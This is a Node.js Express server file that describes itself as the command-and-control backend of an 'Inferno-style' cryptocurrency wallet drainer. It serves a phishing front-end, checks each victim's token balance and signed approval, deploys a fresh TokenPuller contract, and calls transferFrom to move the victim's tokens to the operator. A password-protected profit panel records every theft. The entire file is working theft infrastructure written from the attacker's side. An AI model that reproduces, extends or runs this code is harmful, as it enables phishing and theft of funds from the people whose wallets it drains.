/**
 * index.js
 * Inferno-style drainer backend (the "command server" / C2).
 *
 * Endpoints:
 *   GET  /                     -> phishing front-end (public)
 *   GET  /api/config           -> decrypted operator config (from CommandChannel)
 *   GET  /api/state?victim=&token=&puller=  -> balance + approval status
 *   POST /api/drain            -> { victim, token } ; deploys a fresh TokenPuller
 *                                  and fires transferFrom(victim -> admin)
 *   GET  /panel                -> operator profit panel (basic auth)
 *   GET  /api/profit           -> JSON for the panel
 *
 * The invariant that makes it work: the VICTIM signs the approval on the
 * front-end; the ADMIN (this process) is the only one that calls transferFrom.
 */
require("dotenv").config();
const express = require("express");
const morgan = require("morgan");
const path = require("path");
const { Chain } = require("./chain");

const app = express();
app.use(morgan("dev"));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const chain = new Chain();

// In-memory campaign ledger (persist to a file in production).
const ledger = []; // { ts, victim, token, symbol, amount, puller, txHash }

// ---------------------------------------------------------------------------
// Public front-end API
// ---------------------------------------------------------------------------

// The front-end fetches this to learn where to point the victim's approvals.
app.get("/api/config", async (req, res) => {
  try {
    const { active, config } = await chain.readConfig();
    res.json({ active, ...config });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Front-end asks: "how much does this victim hold, and are they approved yet?"
app.get("/api/state", async (req, res) => {
  const { victim, token, puller } = req.query;
  if (!victim || !token) return res.status(400).json({ error: "victim and token required" });
  try {
    const state = await chain.tokenState(token, victim, puller || null);
    res.json(state);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------------------------------------------------------------------------
// Operator API (the C2 "fire the drain" button)
// ---------------------------------------------------------------------------

app.post("/api/drain", async (req, res) => {
  const { victim, token } = req.body;
  if (!victim || !token) return res.status(400).json({ error: "victim and token required" });
  try {
    // 1) Check the victim actually approved a puller (or we deploy one they
    //    already approved via the front-end flow).
    const pre = await chain.tokenState(token, victim, null);
    if (pre.balance === 0n) {
      return res.status(409).json({ error: "victim balance is zero", state: pre });
    }

    // 2) Deploy a FRESH single-use TokenPuller.
    const { address: pullerAddr, contract: puller } = await chain.deployPuller(victim, token);

    // 3) The victim must have approved THIS puller. In the real flow the
    //    front-end points the approval at the puller address the server
    //    pre-announces. Here we support both: if not approved, we tell the
    //    operator to have the victim sign for this address.
    const st = await chain.tokenState(token, victim, pullerAddr);
    if (!st.approved) {
      return res.status(409).json({
        error: "victim has not approved this puller yet",
        puller: pullerAddr,
        hint: "Have the victim sign setApprovalForAll/approve for this address, then retry.",
        state: st,
      });
    }

    // 4) Fire the drain.
    const { txHash, blockNumber } = await chain.drain(pullerAddr, token);

    // 5) Record profit.
    const entry = {
      ts: new Date().toISOString(),
      victim,
      token,
      symbol: st.symbol,
      amount: st.balanceHuman,
      puller: pullerAddr,
      txHash,
      blockNumber,
    };
    ledger.push(entry);
    res.json({ ok: true, ...entry });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------------------------------------------------------------------------
// Operator panel
// ---------------------------------------------------------------------------

function panelAuth(req, res, next) {
  // Basic auth: user "admin", password from .env PANEL_PASS (default "inferno")
  const pass = process.env.PANEL_PASS || "inferno";
  const auth = req.headers["authorization"] || "";
  const [user, pw] = Buffer.from(auth.replace("Basic ", ""), "base64").toString().split(":");
  if (user === "admin" && pw === pass) return next();
  res.set("WWW-Authenticate", 'Basic realm="panel"');
  res.status(401).send("unauthorized");
}

app.get("/api/profit", panelAuth, (req, res) => {
  const total = ledger.reduce((s, e) => s + (e.amount || 0), 0);
  res.json({
    totalDrains: ledger.length,
    totalAmount: total,
    admin: chain.adminAddress,
    entries: ledger,
  });
});

app.get("/panel", panelAuth, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "panel.html"));
});

// ---------------------------------------------------------------------------

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Inferno C2 listening on http://localhost:${PORT}`);
  console.log(`Admin key: ${chain.adminAddress}`);
  console.log(`CommandChannel: ${chain.channelAddr}`);
});
